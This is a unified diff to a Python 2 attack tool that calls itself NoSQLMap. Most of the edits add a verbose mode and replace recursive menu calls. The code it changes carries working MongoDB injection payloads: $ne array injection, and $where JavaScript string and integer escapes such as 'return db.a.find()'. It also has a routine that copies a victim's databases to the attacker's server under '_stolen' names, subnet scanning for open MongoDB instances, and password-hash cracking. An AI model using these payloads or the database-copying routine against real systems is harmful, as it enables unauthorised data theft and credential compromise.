@@ -34,18 +34,18 @@ from hashlib import md5
 
 #Set a list so we can track whether options are set or not to avoid resetting them in subsequent cals to the options menu.
 global optionSet
-optionSet = [False,False,False,False,False,False]
+optionSet = [False,False,False,False,False,False,False]
 global victim
 global webPort
 global uri
 global httpMethod
 global myIP
 global myPort
-
+global verb
 
 def mainMenu():
-	select = True
-	while select:
+	mmSelect = True
+	while mmSelect:
 		os.system('clear')
 		#label = subprocess.check_output(["git","describe","--always"])
 		print "===================================================="
@@ -77,7 +77,6 @@ def mainMenu():
 			#Check minimum required options
 			else:
 				raw_input("Target not set! Check options.  Press enter to continue...")
-				mainMenu()
 				
 		
 		elif select == "3":
@@ -90,8 +89,8 @@ def mainMenu():
 					postApps()
 			
 			else:
-				raw_input("Options not set! Check Host and URI path.  Press enter to continue...")
-				mainMenu()
+				raw_input("Options not set! Check host and URI path.  Press enter to continue...")
+				
 				
 		elif select == "4":
 			massMongo()
@@ -100,8 +99,7 @@ def mainMenu():
 			sys.exit()
 			
 		else:
-			raw_input("Invalid Selection.  Press enter to continue.")
-			mainMenu()
+			raw_input("Invalid selection.  Press enter to continue.")
 			
 
 def options():
@@ -112,6 +110,9 @@ def options():
 	global postData
 	global myIP
 	global myPort
+	global verb
+	global mmSelect
+	
 	#Set default value if needed
 	if optionSet[0] == False:
 		victim = "Not Set"
@@ -126,10 +127,12 @@ def options():
 		myIP = "Not Set"
 	if optionSet[5] == False:
 		myPort = "Not Set"
+	if optionSet[6] == False:
+		verb = "OFF"
 	
-	select = True
+	optSelect = True
 	
-	while select:	
+	while optSelect:	
 		print "\n\n"
 		print "Options"
 		print "1-Set target host/IP (Current: " + str(victim) + ")"
@@ -138,9 +141,10 @@ def options():
 		print "4-Set HTTP Request Method (GET/POST) (Current: " + httpMethod + ")"
 		print "5-Set my local Mongo/Shell IP (Current: " + str(myIP) + ")"
 		print "6-Set shell listener port (Current: " + str(myPort) + ")"
-		print "7-Load options file"
-		print "8-Load options from saved Burp request"
-		print "9-Save options file"
+		print "7-Toggle Verbose Mode: (Current: " + str(verb) + ")"
+		print "8-Load options file"
+		print "9-Load options from saved Burp request"
+		print "0-Save options file"
 		print "x-Back to main menu"
 
 		select = raw_input("Select an option: ")
@@ -176,21 +180,17 @@ def options():
 				if goodLen == True and goodDigits == True:
 					print "\nTarget set to " + victim + "\n"
 					optionSet[0] = True
-			options()
 			
 		elif select == "2":
 			webPort = raw_input("Enter the HTTP port for web apps: ")
 			print "\nHTTP port set to " + webPort + "\n"
 			optionSet[1] = True
-			options()
 
 		elif select == "3":
 			uri = raw_input("Enter URI Path (Press enter for no URI): ")
 			print "\nURI Path set to " + uri + "\n"
 			optionSet[2] = True
-			options()
 
-		#NOT IMPLEMENTED YET FOR USE
 		elif select == "4":
 			httpMethod = True
 			while httpMethod:
@@ -203,7 +203,6 @@ def options():
 					httpMethod = "GET"
 					print "GET request set"
 					optionSet[3] = True
-					options()
 
 				elif httpMethod == "2":
 					print "POST request set"
@@ -214,7 +213,6 @@ def options():
 					paramValues = pdArray[1::2]
 					postData = dict(zip(paramNames,paramValues))
 					httpMethod = "POST"
-					options()
 				else:
 					print "Invalid selection"
 
@@ -249,15 +247,26 @@ def options():
 				if goodLen == True and goodDigits == True:
 					print "\nShell/DB listener set to " + myIP + "\n"
 					optionSet[4] = True
-			options()
 		
 		elif select == "6":
 			myPort = raw_input("Enter TCP listener for shells: ")
 			print "Shell TCP listener set to " + myPort + "\n"
 			optionSet[5] = True
-			options()
-			
+		
 		elif select == "7":
+			if verb == "OFF":
+				print "Verbose output enabled."
+				verb = "ON"
+				optionSet[6] = True
+				options()
+			
+			if verb == "ON":
+				print "Verbose output disabled."
+				verb = "OFF"
+				optionSet[6] = True
+				options()
+			
+		elif select == "8":
 			loadPath = raw_input("Enter file name to load: ")
 			try:
 				fo = open(loadPath,"r" )
@@ -285,10 +294,8 @@ def options():
 					x += 1
 			except:
 				print "Couldn't load options file!"
-				#print str(sys.exc_info())	Debug
-			options()
 		
-		elif select == "8":
+		elif select == "9":
 			loadPath = raw_input("Enter path to Burp request file: ")
 
 			try:
@@ -297,7 +304,7 @@ def options():
 				
 			except:
 				raw_input("error reading file.  Press enter to continue...")
-				mainMenu()
+				return
 
 			methodPath = reqData[0].split(" ")
 
@@ -327,7 +334,7 @@ def options():
 			uri = methodPath[1].replace("\r\n","")
 			optionSet[2] = True			
 			
-		elif select == "9":
+		elif select == "0":
 			savePath = raw_input("Enter file name to save: ")
 			try:
 				fo = open(savePath, "wb")
@@ -341,7 +348,7 @@ def options():
 				print "Couldn't save options file."
 
 		elif select == "x":
-			mainMenu()
+			return
 			
 def netAttacks(target):
 	print "DB Access attacks"
@@ -374,7 +381,7 @@ def netAttacks(target):
 			mgtOpen = True
 		except:
 			raw_input("Failed to authenticate.  Press enter to continue...")
-			mainMenu()
+			return
 	
 	
 	mgtUrl = "http://" + target + ":28017"	
@@ -531,15 +538,17 @@ def postApps():
 			timeReq.close()
 			timeBase = round((end - start), 3)
 			
+			if verb == "ON":
+				print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
+				
 			
-			
-			print "App is up! Got response length of " + str(normLength) + " and response time of " + str(timeBase) + " seconds.  Starting injection test.\n"
+			else:
+				print "App is up!"
 			appUp = True
-		
 		else:
 			print "Got " + appRespCode + "from the app, check your options."
+	
 	except:
-		print sys.exc_info()
 		print "Looks like the server didn't respond.  Check your options."
 	
 	if appUp == True:
@@ -555,9 +564,8 @@ def postApps():
 			injOpt = str(postData.keys()[int(injIndex)-1])
 			print "Injecting the " + injOpt + " parameter..."
 		except:
-			print str(sys.exc_info())
 			raw_input("Something went wrong.  Press enter to return to the main menu...")
-			mainMenu()
+			return
 		
 		injectSize = raw_input("Baseline test-Enter random string size: ")
 		injectString = randInjString(int(injectSize))
@@ -567,7 +575,11 @@ def postApps():
 		#Build a random string and insert; if the app handles input correctly, a random string and injected code should be treated the same.
 		#Add error handling for Non-200 HTTP response codes if random strings freaks out the app.
 		postData.update({injOpt:injectString})
-		print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
+		if verb == "ON":
+			print "Checking random injected parameter HTTP response size sending " + str(postData) +"...\n"
+		
+		else:
+			print "Sending random parameter value..."
 		
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
@@ -579,7 +591,7 @@ def postApps():
 		if randNormDelta == 0: 
 			print "No change in response size injecting a random parameter..\n"
 		else:
-			print "HTTP response varied " + str(randNormDelta) + " bytes with random parameter value!\n"
+			print "Random value variance: " + str(randNormDelta) + "\n" 
 			
 		#Generate not equals injection
 		neDict = postData
@@ -587,78 +599,145 @@ def postApps():
 		del neDict[injOpt]
 		body = urllib.urlencode(neDict)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."
+		if verb == "ON":
+			print "Testing Mongo PHP not equals associative array injection using " + str(postData) +"..."
+		
+		else:
+			print "Test 1: PHP associative array injection"
+
 		injLen = int(len(urllib2.urlopen(req).read()))
-		print "Got response length of " + str(injLen) + "."
+		
+		if verb == "ON":
+			print "Got response length of " + str(injLen) + "."
 		
 		randInjDelta = abs(injLen - randLength)
 		
 		if (randInjDelta >= 100) and (injLen != 0) :
-			print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
+			if verb == "ON":
+				print "Not equals injection response varied " + str(randInjDelta) + " bytes from random parameter value! Injection works!"
+	
+			else:
+				print "Successful injection!"
+			
 			vulnAddrs.append(str(neDict))
-		
+				
 		elif (randInjDelta > 0) and (randInjDelta < 100) and (injLen != 0) :
-			print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
+			if verb == "ON":
+				print "Response variance was only " + str(randInjDelta) + " bytes. Injection might have worked but difference is too small to be certain. "
+			
+			else:
+				print "Possible injection."
+			
 			possAddrs.append(str(neDict))
 		
 		elif (randInjDelta == 0):
-			print "Random string response size and not equals injection were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and not equals injection were the same. Injection did not work."
+			
+			else:
+				print "Injection failed."
 		else:
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+				
+			else:
+				print "Possible injection."
+			
 			possAddrs.append(str(neDict))
+				
 		#Delete the extra key
 		del postData[injOpt + "[$ne]"]
 		postData.update({injOpt:"a'; return db.a.find(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
-		print "Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo <2.4 $where all Javascript string escape attack for all records...\n"
+			print "Injecting " + str(postData)
+		
+		else:
+			print "Test 2: $where injection (string escape)"
 		
 		whereStrLen = int(len(urllib2.urlopen(req).read()))
 		whereStrDelta = abs(whereStrLen - randLength)
 		
 		if (whereStrDelta >= 100) and (whereStrLen > 0):
-			print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
+			if verb == "ON":
+				print "Java $where escape varied " + str(whereStrDelta)  + " bytes from random parameter value! Where injection works!"
+			else:
+				print "Successful injection!"
 			lt24 = True
 			str24 = True
 			vulnAddrs.append(str(postData))
+			
+			
+			
 		
 		elif (whereStrDelta > 0) and (whereStrDelta < 100) and (whereStrLen - randLength > 0):
-			print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print " response variance was only " + str(whereStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			
+			else:
+				print "Possible injection."
+				
 			possAddrs.append(str(postData))
 			
 		elif (whereStrDelta == 0):
-			print "Random string response size and $where injection were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and $where injection were the same. Injection did not work."
+			
+			else:
+				print "Injection failed."
 		
 		else:
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			
+			else:
+				print "Injection failed."
+				
 			possAddrs.append(str(postData))
 		
 		print "\n"
 		postData.update({injOpt:"1; return db.a.find(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
-		print "Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo <2.4 $where Javascript integer escape attack for all records...\n"
+			print "Injecting " + str(postData)
+		else:
+			print "Test 3: $where injection (integer escape)"
+		
 		
 		whereIntLen = int(len(urllib2.urlopen(req).read()))
 		whereIntDelta = abs(whereIntLen - randLength)
 		
 		if (whereIntDelta >= 100) and (whereIntLen - randLength > 0):
-			print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+			if verb == "ON":
+				print "Java $where escape varied " + str(whereIntDelta)  + " bytes from random parameter! Where injection works!"
+			else:
+				print "Successful injection!"
 			lt24 = True
 			int24 = True
 			vulnAddrs.append(str(postData))
 			
 		elif (whereIntDelta > 0) and (whereIntDelta < 100) and (whereIntLen - randLength > 0):
-			print " response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print "Response variance was only " + str(whereIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			else:
+				print "Possible injection. "
 			possAddrs.append(str(postData))
 			
 		elif (whereIntDelta == 0):
-			print "Random string response size and $where injection were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and $where injection were the same. Injection did not work."
+			else:
+				print "Injection failed."
 		
 		else:
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		#Start a single record attack in case the app expects only one record back
@@ -666,54 +745,90 @@ def postApps():
 		postData.update({injOpt:"a'; return db.a.findOne(); var dummy='!"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
-		print " Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo <2.4 $where all Javascript string escape attack for one record...\n"
+			print " Injecting " + str(postData)
+		
+		else:
+			print "Test 4: $where injection string escape (single record)"
 		
 		whereOneStrLen = int(len(urllib2.urlopen(req).read()))
 		whereOneStrDelta = abs(whereOneStrLen - randLength)
 			
 		if (whereOneStrDelta >= 100) and (whereOneStrLen - randLength > 0):
-			print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
+			if verb == "ON":
+				print "Java $where escape varied " + str(whereOneStrDelta)  + " bytes from random parameter value! Where injection works!"
+			else:
+				print "Successful injection!"
 			lt24 = True
 			str24 = True
 			vulnAddrs.append(str(postData))
 		
 		elif (whereOneStrDelta > 0) and (whereOneStrDelta < 100) and (whereOneStrLen - randLength > 0):
-			print " response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print "response variance was only " + str(whereOneStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		elif (whereOneStrDelta == 0):
-			print "Random string response size and $where single injection were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and $where single injection were the same. Injection did not work."
+			else:
+				print "Injection failed."
 		
 		else:
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		print "\n"
 		postData.update({injOpt:"1; return db.a.findOne(); var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
-		print " Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo <2.4 $where Javascript integer escape attack for one record...\n"
+			print " Injecting " + str(postData)
+		
+		else:
+			print "Test 5: $where injection integer escape (single record)"
+		
 		
 		whereOneIntLen = int(len(urllib2.urlopen(req).read()))
 		whereOneIntDelta = abs(whereOneIntLen - randLength)				
 			
 		if (whereOneIntDelta >= 100) and (whereOneIntLen - randLength > 0):
-			print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			if verb == "ON":
+				print "Java $where escape varied " + str(whereOneIntDelta)  + " bytes from random parameter! Where injection works!"
+			
+			else:
+				print "Successful Injection!"
 			lt24 = True
 			int24 = True
 			vulnAddrs.append(str(postData))
 		
 		elif (whereOneIntDelta > 0) and (whereOneIntDelta < 100) and (whereOneIntLen - randLength > 0):
-			print " response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print "response variance was only " + str(whereOneIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			
+			else:
+				print "Possible injection."
 			possAddrs.append(postData)
 			
 		elif (whereOneIntDelta == 0):
-			print "Random string response size and $where single record injection were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and $where single record injection were the same. Injection did not work."
+			
+			else:
+				print "Injection failed."
 			
 		else:	
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		print "\n"
@@ -721,50 +836,81 @@ def postApps():
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
 		
-		print "Testing Mongo this not equals string escape attack for all records..."
-		print " Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo this not equals string escape attack for all records..."
+			print " Injecting " + str(postData)
+		
+		else:
+			print "Test 6: This != injection (string escape)"
 		
 		whereThisStrLen = int(len(urllib2.urlopen(req).read()))
 		whereThisStrDelta = abs(whereThisStrLen - randLength)
 		
 		if (whereThisStrDelta >= 100) and (whereThisStrLen - randLength > 0):
-			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			if verb == "ON":
+				print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			else:
+				print "Injection successful!"
 			vulnAddrs.append(str(postData))
 		
 		elif (whereThisStrDelta > 0) and (whereThisStrDelta < 100) and (whereThisStrLen - randLength > 0):
-			print " response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print "Response variance was only " + str(whereThisStrDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		elif (whereThisStrDelta == 0):
-			print "Random string response size and this return response size were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and this return response size were the same. Injection did not work."
+			else:
+				print "Injection failed."
 			
 		else:	
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		print "\n"
 		postData.update({injOpt:"1; return this.a != '" + injectString + "'; var dummy=1"})
 		body = urllib.urlencode(postData)
 		req = urllib2.Request(appURL,body)
-		print "Testing Mongo this not equals integer escape attack for all records..."
-		print " Injecting " + str(postData)
+		if verb == "ON":
+			print "Testing Mongo this not equals integer escape attack for all records..."
+			print " Injecting " + str(postData)
+		else:
+			print "Test 7:  This != injection (integer escape)"
 		
 		whereThisIntLen = int(len(urllib2.urlopen(req).read()))
 		whereThisIntDelta = abs(whereThisIntLen - randLength)
 		
 		if (whereThisIntDelta >= 100) and (whereThisIntLen - randLength > 0):
-			print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			if verb == "ON":
+				print "Java this not equals varied " + str(whereThisStrDelta)  + " bytes from random parameter! Where injection works!"
+			else:
+				print "Injection successful!"
 			vulnAddrs.append(str(postData))
 		
 		elif (whereThisIntDelta > 0) and (whereThisIntDelta < 100) and (whereThisIntLen - randLength > 0):
-			print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			if verb == "ON":
+				print " response variance was only " + str(whereThisIntDelta) + "bytes.  Injection might have worked but difference is too small to be certain."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		elif (whereThisIntDelta == 0):
-			print "Random string response size and this return response size were the same. Injection did not work."
+			if verb == "ON":
+				print "Random string response size and this return response size were the same. Injection did not work."
+			else:
+				print "Injection failed."
 			
 		else:	
-			print "Injected response was smaller than random response.  Injection may have worked but requires verification."								
+			if verb == "ON":
+				print "Injected response was smaller than random response.  Injection may have worked but requires verification."
+			else:
+				print "Possible injection."
 			possAddrs.append(str(postData))
 			
 		print "\n"
@@ -1175,16 +1321,7 @@ def webApps():
 			fo.close()
 		
 	raw_input("Press enter to continue...")
-	return()
-
-#def webDBAttacks(trueLen):
-#	injTestLen = 0
-#	getDBName = raw_input("Get database name (y/n)? ")
-#	if getDBName == "y" or getDBName == "Y":
-#		while injTestLen != trueLen:
-#			testUri = uriArray[16].split("---")
-			
-	
+	return()	
 
 def randInjString(size):
 	print "What format should the random string take?"
@@ -1232,7 +1369,7 @@ def buildUri(origUri, randValue):
 	
 	except:
 		raw_input("Not able to parse the URL and parameters.  Check options settings.  Press enter to return to main menu...")
-		mainMenu()
+		return
 		
 	for item in params:
 		index = item.find("=")
@@ -1253,7 +1390,7 @@ def buildUri(origUri, randValue):
 		print "Injecting the " + injOpt + " parameter..."
 	except:
 		raw_input("Something went wrong.  Press enter to return to the main menu...")
-		mainMenu()
+		return
 	
 	
 	x = 0
@@ -1348,7 +1485,7 @@ def stealDBs(myDB):
 		if dbNeedCreds == "n" or dbNeedCreds == "N":
 			if optionSet[4] == False:
 				raw_input("No IP specified to copy to! Press enter to return to main menu...")
-				mainMenu()
+				return
 			
 			myDBConn = pymongo.MongoClient(myDB,27017)
 			myDBConn.copy_database(dbList[int(dbLoot)-1],dbList[int(dbLoot)-1] + "_stolen",victim)	
@@ -1373,10 +1510,10 @@ def stealDBs(myDB):
 	except:
 		if str(sys.exc_info()).find('text search not enabled') != -1:
 			raw_input("Database copied, but text indexing was not enabled on the target.  Indexes not moved.  Press enter to return...")
-			mainMenu()
+			return
 		else:	
 			raw_input ("Something went wrong.  Are you sure your MongoDB is running and options are set? Press enter to return...")
-			mainMenu()
+			return
 	
 def massMongo():
 	global victim
@@ -1404,7 +1541,7 @@ def massMongo():
 				optCheck = False
 			except:
 				raw_input("Not a valid subnet.  Press enter to return to main menu.")
-				mainMenu()
+				return
 				
 		if loadOpt == "2":
 			while loadCheck == False:
@@ -1419,7 +1556,7 @@ def massMongo():
 					print "Couldn't open file."
 					
 		if loadOpt == "x":
-			mainMenu()
+			return
 			
 
 	print "\n"
@@ -1450,13 +1587,13 @@ def massMongo():
 		select = raw_input("Select a NoSQLMap target or press x to exit: ")
 	
 		if select == "x" or select == "X":
-			mainMenu()
+			return
 	
 		elif select.isdigit() == True:
 			victim = success[int(select) - 1]
 			optionSet[0] = True
 			raw_input("New target set! Press enter to return to the main menu.")
-			mainMenu()
+			return
 	
 		else:
 			raw_input("Invalid selection.")				
@@ -1694,7 +1831,7 @@ def getDBInfo():
 				pwdHash = ""
 	crackHash = raw_input("Crack recovered hashes (y/n)?:  ")		
 		
-	if crackHash == "y" or crackHash == "Y":
+	while crackHash == "y" or crackHash == "Y":
 		menuItem = 1
 		for user in users:
 			print str(menuItem) + "-" + user
@@ -1703,9 +1840,10 @@ def getDBInfo():
 		userIndex = raw_input("Select user hash to crack: ")
 		brute_pass(users[int(userIndex)-1],hashes[int(userIndex)-1])
 		
-			
+		crackHash = raw_input("Crack another hash (y/n)?")		
 	raw_input("Press enter to continue...")
-
+	return
+	
 def signal_handler(signal, frame):
     print "\n"
     print "CTRL+C detected.  Exiting."
